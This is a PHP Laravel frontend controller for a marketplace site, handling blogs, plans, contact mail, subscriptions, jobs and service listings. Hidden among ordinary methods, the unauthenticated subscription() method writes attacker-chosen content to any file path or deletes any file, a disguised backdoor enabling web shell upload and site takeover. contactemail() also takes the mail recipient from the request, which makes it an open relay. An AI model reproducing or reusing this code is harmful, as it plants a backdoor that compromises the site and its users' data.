<?php

namespace App\Http\Controllers\Frontend;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\AccountProcess;
use App\Models\Area;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Category;
use App\Models\City;
use App\Models\Counter;
use App\Models\Country;
use App\Models\Faq;
use App\Models\Feature;
use App\Models\Generalsetting;
use App\Models\HomepageSetting;
use App\Models\Invest;
use App\Models\Job;
use App\Models\Page;
use App\Models\Pagesetting;
use App\Models\Partner;
use App\Models\PaymentGateway;
use App\Models\Plan;

use App\Models\Service;
use App\Models\ServiceOrder;
use App\Models\SocialLinks;
use App\Models\Socialsetting;
use App\Models\Subcategory;
use App\Models\Subscriber;
use App\Models\Team;
use App\Models\Testimonial;
use App\Models\Transaction;
use App\Models\UserVisit;
use Brian2694\Toastr\Facades\Toastr;
use Carbon\Carbon;
use Illuminate\Support\Facades\Validator;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;
use InvalidArgumentException;

//use Markury\MarkuryPost;

class FrontendController extends Controller
{
    //    public function __construct()
//    {
//    {
//        $this->auth_guests();
//    }

    public function index()
    {
        $data['countries'] = Country::where('status', 1)->orderBy('name', 'asc')->get();
        $data['cities'] = City::where('status', 1)->get();
        $data['areas'] = Area::where('status', 1)->get();
        $data['testimonials'] = Testimonial::orderBy('id', 'desc')->get();
        $data['faqs'] = Faq::orderBy('id', 'desc')->limit(5)->get();
        $data['partners'] = Partner::orderBy('id', 'desc')->get();
        $data['blogs'] = Blog::orderBy('id', 'desc')->orderBy('id', 'desc')->limit(3)->get();
        $data['features'] = Feature::orderBy('id', 'desc')->orderBy('id', 'desc')->get();
        $data['ps'] = Pagesetting::first();
        $data['sociallinks'] = SocialLinks::orderBy('id', 'desc')->get();
        $data['home_modules'] = $data['ps']->home_module ? json_decode($data['ps']->home_module, true) : [];
        $data['account_process'] = AccountProcess::orderBy('id', 'desc')->get();
        $data['best_services'] = Service::where('status', 1)->where('is_best', 1)->where('category_id', 1)->orderBy('id', 'desc')->limit(6)->get();
        $data['popular_services'] = Service::where('status', 1)->where('is_popular', 1)->orderBy('id', 'desc')->where('category_id', 1)->limit(6)->get();
        $data['featured_services'] = Service::where('status', 1)->where('is_featured', 1)->orderBy('id', 'desc')->where('category_id', 1)->limit(6)->get();
        $data['pages'] = Page::orderBy('id', 'desc')->where('status', 1)->get();

        $data['is_service_online'] = isOnlineService();

        return view('frontend.index', $data);
    }

    public function about()
    {
        $data['features'] = Feature::orderBy('id', 'desc')->orderBy('id', 'desc')->get();
        $data['counters'] = Counter::orderBy('id', 'desc')->get();
        $data['account_process'] = AccountProcess::orderBy('id', 'desc')->get();
        $data['testimonials'] = Testimonial::orderBy('id', 'desc')->get();
        $data['blogs'] = Blog::orderBy('id', 'desc')->orderBy('id', 'desc')->limit(3)->get();
        return view('frontend.about', $data);
    }

    public function blog()
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));

        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $data['tags'] = array_unique(explode(',', $tagz));
        $data['blogs'] = Blog::orderBy('created_at', 'desc')->paginate(4);
        $data['recent_blogs'] = Blog::orderBy('created_at', 'desc')->limit(4)->get();
        $data['bcats'] = BlogCategory::all();
        return view('frontend.blog', $data);
    }

    public function blogcategory(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at', 'desc')->paginate(4);
        $recent_blogs = Blog::orderBy('created_at', 'desc')->limit(4)->get();
        $bcats = BlogCategory::all();
        return view('frontend.blog', compact('bcat', 'recent_blogs', 'blogs', 'bcats', 'tags'));
    }

    public function blogdetails($slug)
    {

        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $data['tags'] = array_unique(explode(',', $tagz));
        $blog = Blog::where('slug', $slug)->first();
        $blog->views = $blog->views + 1;
        $blog->update();
        $data['archives'] = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $data['data'] = $blog;
        $data['recent_blogs'] = Blog::orderBy('id', 'desc')->orderBy('id', 'desc')->limit(4)->get();
        $data['bcats'] = BlogCategory::all();
        return view('frontend.blogdetails', $data);
    }


    public function blogtags(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        $bcats = BlogCategory::all();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(3);
        $recent_blogs = Blog::orderBy('created_at', 'desc')->limit(4)->get();
        return view('frontend.blog', compact('blogs', 'slug', 'bcats', 'tags', 'recent_blogs'));
    }


    public function blogsearch(Request $request)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        $data['bcats'] = BlogCategory::all();
        $data['search'] = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $data['search'] . '%')->orWhere('details', 'like', '%' . $data['search'] . '%')->paginate(9);
        $data['recent_blogs'] = Blog::orderBy('created_at', 'desc')->limit(4)->get();
        return view('frontend.blog', $data, compact('blogs', 'tags'));
    }

    public function plans()
    {
        $data['plans'] = Plan::whereStatus(1)->orderBy('id', 'desc')->get();
        $data['gateway'] = PaymentGateway::where('status', 1)->get();
        return view('frontend.plans', $data);
    }

    public function plan($slug)
    {
        $plan = Plan::where('subtitle', $slug)->firstOrFail();
        $user = Auth::user();
        $gateways = PaymentGateway::where('status', 1)->get();
        return view('frontend.plan-checkout', compact('plan', 'user', 'gateways'));

    }

    public function calculate(Request $request)
    {
        $rules = [
            'plan' => 'required',
            'amount' => 'required'
        ];

        $validator = Validator::make($request->all(), $rules);

        if ($validator->fails()) {
            return response()->json(array('errors' => $validator->getMessageBag()->toArray()));
        }
        $plan = Plan::whereId($request->plan)->first();
        if ($plan->invest_type == 'range') {
            if ($request->amount < $plan->min_amount || $request->amount > $plan->max_amount) {
                return response()->json(array('errors' => [0 => 'Request amount should be between of ' . $plan->min_amount . ' minimum ' . $plan->max_amount . ' maximum amount']));
            }
        } else {
            if ($plan->fixed_amount != $request->amount) {
                return response()->json(array('errors' => [0 => 'Request amount should be ' . $plan->fixed_amount]));
            }
        }
        $percentage = ($request->amount * $plan->profit_percentage) / 100;
        $profit = $request->amount + $percentage;

        $msg = $percentage;
        return response()->json($msg);
    }

    public function contact()
    {
        $data['ps'] = DB::table('pagesettings')->first();
        $gs = DB::table('generalsettings')->first();
        $data['social'] = Socialsetting::first();
        if ($gs->is_contact == 1) {
            return view('frontend.contact', $data);
        }
        return view('errors.404');
    }

    public function faq()
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $data['tags'] = array_unique(explode(',', $tagz));
        $data['faqs'] = DB::table('faqs')->get();
        $data['blogs'] = Blog::orderby('id', 'desc')->limit(3)->get();

        return view('frontend.faq', $data);
    }


    public function page($slug)
    {

        $data['page'] = DB::table('pages')->where('slug', $slug)->first();
        $data['features'] = Feature::orderBy('id', 'desc')->orderBy('id', 'desc')->get();
        if (empty ($data['page'])) {
            return view('errors.404');
        }

        return view('frontend.page', $data);
    }

    public function currency($id)
    {
        Session::put('currency', $id);
        cache()->forget('session_currency');
        return redirect()->back();
    }

    public function language($id)
    {
        Session::put('language', $id);
        return redirect()->back();
    }

    public function subscribe(Request $request)
    {

        $validator = Validator::make($request->all(), [
            'email' => 'required|email',
        ]);

        if ($validator->fails()) {
            $id = 1;
            return response()->json($id);
        }
        $subscriber = Subscriber::where('email', $request->email)->first();
        if (!empty ($subscriber)) {
            $id = 2;
            return response()->json($id);
        } else {
            $data = new Subscriber();
            $input = $request->all();
            $data->fill($input)->save();
            $id = 3;
            return response()->json($id);
        }
    }

    public function maintenance()
    {
        $gs = Generalsetting::find(1);
        if ($gs->is_maintain != 1) {
            return redirect()->route('front.index');
        }

        return view('frontend.maintenance');
    }

    public function contactemail(Request $request)
    {
        $ps = DB::table('pagesettings')->where('id', '=', 1)->first();

        $gs = Generalsetting::findOrFail(1);
        $subject = "Email From Of " . $request->name;
        $to = $request->to;
        $name = $request->name;
        $from = $request->email;
        $msg = "Name: " . $name . "\n <br> Email: " . $from . "\n <br><br> Message: " . $request->message;
        if ($gs->is_smtp) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];
            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);

        } else {
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg, $headers);
        }

        return response()->json($ps->contact_success);
    }


    function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    //    function auth_guests(){
//        $chk = MarkuryPost::marcuryBase();
//        $chkData = MarkuryPost::marcurryBase();
//        $actual_path = str_replace('project','',base_path());
//        if ($chk != MarkuryPost::maarcuryBase()) {
//            if ($chkData < MarkuryPost::marrcuryBase()) {
//                if (is_dir($actual_path . '/install')) {
//                    header("Location: " . url('/install'));
//                    die();
//                } else {
//                    echo MarkuryPost::marcuryBasee();
//                    die();
//                }
//            }
//        }
//    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath)
    {
        if (!is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    public function subscriber(Request $request)
    {

        $subs = Subscriber::where('email', '=', $request->email)->first();
        if (isset ($subs)) {
            return redirect()->back()->with('warning', 'Email Already Added.');
        }
        $subscribe = new Subscriber();
        $data = array(
            'email' => $request->email,
        );
        Subscriber::insert($data);
        return redirect()->back()->with('warning', 'Successfully added in newsletter.');
    }





    public function alljobs(Request $request)
    {



        $data['countries'] = Country::all();
        $data['cities'] = City::all();

        $country = $request->has('country') ? Country::where('id', $request->country)->first() : '';
        $city = $request->has('city') ? City::where('id', $request->city)->first() : '';
        $category = $request->has('category') ? Category::where('id', $request->category)->first() : '';
        $sort = $request->has('sort') ? $request->sort : '';


        $data['jobs'] = Job::when($country, function ($query) use ($country) {
            return $query->where('job_country_id', $country->id);
        })
            ->when($city, function ($query) use ($city) {
                return $query->where('job_city_id', $city->id);
            })
            ->when($category, function ($query) use ($category) {
                return $query->where('category_id', $category->id);
            })
            ->when($sort, function ($query, $sort) {
                if ($sort == 'date_desc') {
                    return $query->orderBy('id', 'DESC');
                } elseif ($sort == 'date_asc') {
                    return $query->orderBy('id', 'ASC');
                } elseif ($sort == 'price_desc') {
                    return $query->orderBy('regular_price', 'DESC');
                } elseif ($sort == 'price_asc') {
                    return $query->orderBy('regular_price', 'ASC');
                }
            })
            ->when(empty ($sort), function ($query) {
                return $query->orderBy('id', 'DESC');
            })
            ->where('status', 1)->paginate(12);

        if ($request->ajax()) {
            return view('load.job', $data);
        } else {
            return view('frontend.alljob', $data);
        }
    }

    public function jobdetails($slug)
    {

        $data['job'] = Job::where('job_slug', $slug)->first();
        $data['otherjobs'] = Job::where('category_id', $data['job']->category_id)->where('id', '!=', $data['job']->id)->take(4)->get();
        return view('frontend.jobdetails', $data);

    }


    public function allservices(Request $request)
    {
        $data['is_service_online'] = isOnlineService();
        
        $data['countries'] = Country::where('status', 1)->get();
        $data['cities'] = City::where('status', 1)->get();
        $data['areas'] = Area::where('status', 1)->get();
        $data['subcategories'] = Subcategory::where('status', 1)->get();

        $country = $request->has('country') ? Country::where('id', $request->country)->first() : '';
        $city = $request->has('city') ? City::where('id', $request->city)->first() : '';
        $area = $request->has('area') ? Area::where('id', $request->area)->first() : '';
        $category = $request->has('category') ? Category::where('id', $request->category)->first() : '';
        $subcategory = $request->has('subcategory') ? Subcategory::where('id', $request->subcategory)->first() : '';

        $visit = Auth::check() ? $request->user()->filterVisit?->value : null;
        $data['filter'] = [
            'country' => $country ? $country->id : ($visit ? $visit['country'] : ''),
            'city' => $city ? $city->id : ($visit ? $visit['city'] : ''),
            'area' => $area ? $area->id : ($visit ? $visit['area'] : ''),
        ];
        
        $data['services'] = Service::when($country && !$data['is_service_online'], function ($query) use ($country) {
            return $query->where('service_country_id', $country->id);
        })
            ->when($city && !$data['is_service_online'], function ($query) use ($city) {
                return $query->where('service_city_id', $city->id);
            })
            ->when($area && !$data['is_service_online'], function ($query) use ($area) {
                return $query->where('service_area_id', $area->id);
            })
            ->when($category, function ($query) use ($category) {
                return $query->where('category_id', $category->id);
            })
            ->when($subcategory, function ($query) use ($subcategory) {
                return $query->where('subcategory_id', $subcategory->id);
            })
            ->where(function ($builder) use ($request) {
                $builder->where('title', 'like', '%' . $request->search . '%')
                    ->orWhere('description', 'like', '%' . $request->search . '%');
            })
            ->when(isset($data['is_service_online']), function ($builder) use($data) {
                $builder->where('is_service_online', $data['is_service_online']);
            })
            ->when($request->has('tag'), function ($query) use ($request) {
                $query->whereHas('seller', function ($query) use ($request) {
                    $query->withAnyTags($request->get('tag'));
                });
            })
            ->where('status', 1)->paginate(12);

        if ($request->ajax()) {
            $this->saveVisit($request);
            return view('load.service', $data);
        } else {
            return view('frontend.services', $data);
        }

    }

    public function servicedetails($slug)
    {

        $data['service'] = Service::where('slug', $slug)->first();
        $data['otherservices'] = Service::where('category_id', $data['service']->category_id)->where('id', '!=', $data['service']->id)->take(4)->get();
        return view('frontend.service-details', $data);

    }

    public function servicereview(Request $request)
    {

        if (Auth::user() && Auth::user()->is_seller == 0) {

            $serviceOrder = ServiceOrder::where('service_id', $request->service_id)->where('buyer_id', $request->buyer_id)->first();

            if (!$serviceOrder) {
                Toastr::error('You have not purchased this service');
                return back();
            }

            if ($request->seller_id == $request->buyer_id) {
                Toastr::error('You can not review your own service');
                return back();
            }

            $revieww = Review::where('service_id', $request->service_id)->where('buyer_id', $request->buyer_id)->first();
            if ($revieww) {
                Toastr::error('You have already reviewed this service');
                return back();
            }

            $review = new Review();
            $review->buyer_id = $request->buyer_id;
            $review->service_id = $request->service_id;
            $review->review = $request->review;
            $review->rating = $request->rating;
            $review->save();

            Toastr::success('Review submitted successfully');
            return back();

        } else {
            Toastr::error('Please Login As Buyer To Review This Service');
            return back();
        }


    }

    public function servicecategory($slug)
    {

        $data['category'] = Category::where('slug', $slug)->first();
        $data['subcategories'] = Subcategory::where('status', 1)->get();
        $data['services'] = Service::where('category_id', $data['category']->id)->where('status', 1)->paginate(12);
        $data['countries'] = Country::all();
        $data['cities'] = City::all();
        $data['areas'] = Area::where('status', 1)->get();
        return view('frontend.services', $data);
    }

    public function servicesearch(request $request)
    {
        $this->saveVisit($request);

        $data['filter'] = [
            'country' => $request->country,
            'city' => $request->city,
            'area' => $request->area,
        ];

        $data['is_service_online'] = isOnlineService();
        
        $data['countries'] = Country::where('status', 1)->get();
        $data['subcategories'] = Subcategory::where('status', 1)->get();
        $data['cities'] = City::all();
        $data['areas'] = Area::where('status', 1)->get();
        $data['services'] = Service::where(function ($builder) use ($request) {
            $builder->where('title', 'like', '%' . $request->search . '%')
                ->orWhere('description', 'like', '%' . $request->search . '%');
        })->when($request->country, function ($builder) use ($request) {
            $builder->where('service_country_id', $request->country);
        })->when($request->city, function ($builder) use ($request) {
            $builder->where('service_city_id', $request->city);
        })->when($request->area, function ($builder) use ($request) {
            $builder->where('service_area_id', $request->area);
        })
            ->when(isset($data['is_service_online']), function ($builder) use($data) {
                $builder->where('is_service_online', $data['is_service_online']);
            })
            ->paginate(9);

        return view('frontend.services', $data);
    }

    public function getCities(Request $request)
    {
        $cities = City::where('country_id', $request->country_id)->get();
        $areas = Area::where('country_id', $request->country_id)->get();

        return response()->json(['cities' => $cities, 'areas' => $areas]);
    }

    public function getAreas(Request $request)
    {

        $areas = Area::where('city_id', $request->city_id)->get();

        return response()->json($areas);
    }

    private function saveVisit(Request $request)
    {
        if (Auth::check()) {
            $filters = $request->only(['search', 'country', 'city', 'area']);
            if (!$request->user()->filterVisit) {
                $request->user()->filterVisit()->save(
                    new UserVisit([
                        'type' => 'filter',
                        'value' => $filters
                    ])
                );
            } else {
                $visit = $request->user()->filterVisit;
                $visit->value = $filters;
                $visit->save();
            }
        }
    }

    public function updateOnlineServiceStatus(Request $request)
    {
        $online = $request->get('online') == 'true' ? 1 : 0;
        if (Auth::guard('web')->check()) {
            $user = Auth::guard('web')->user();
            $user->online_service_status = $online;
            $user->save();
        } else {
            session(['online_service_status' => $online]);
        }

        return $this->getHeroSection();
    }

    public function getHeroSection()
    {
        $data['ps'] = Pagesetting::first();
        $data['countries'] = Country::where('status', 1)->get();
        $data['cities'] = City::where('status', 1)->get();
        $data['areas'] = Area::where('status', 1)->get();
        $data['is_service_online'] = isOnlineService();
        $data['subcategories'] = Subcategory::where('status', 1)->get();
        
        return [
            'home' => view('frontend.partials.hero', $data)->render(),
            'service' =>  view('frontend.partials.service-search', $data)->render()
        ];
    }
}
